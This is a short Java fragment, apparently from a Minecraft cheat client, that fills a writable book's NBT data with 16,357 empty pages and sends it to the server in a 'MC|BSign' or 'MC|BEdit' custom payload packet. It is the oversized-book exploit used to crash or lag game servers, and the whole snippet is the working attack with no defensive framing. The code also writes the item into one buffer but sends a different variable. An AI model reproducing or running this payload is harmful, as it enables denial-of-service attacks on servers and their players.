				NBTTagCompound page = new NBTTagCompound();
				NBTTagList list = new NBTTagList();
				int n = 0;
				while (n < 16357) {
					list.appendTag(new NBTTagString(""));
					n++;
				}
				list.appendTag(new NBTTagString(string));
				page.setString("author", "Server");
				page.setString("title", "lol");
				page.setByte("resolved", (byte) 1);
				page.setTag("pages", list);
                ItemStack book = new ItemStack(Items.writable_book);
                book.setTagCompound(page);
                PacketBuffer pb = new PacketBuffer(Unpooled.buffer());
                pb.writeItemStackToBuffer(book);
                Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload(isSign ? "MC|BSign" : "MC|BEdit", buffer));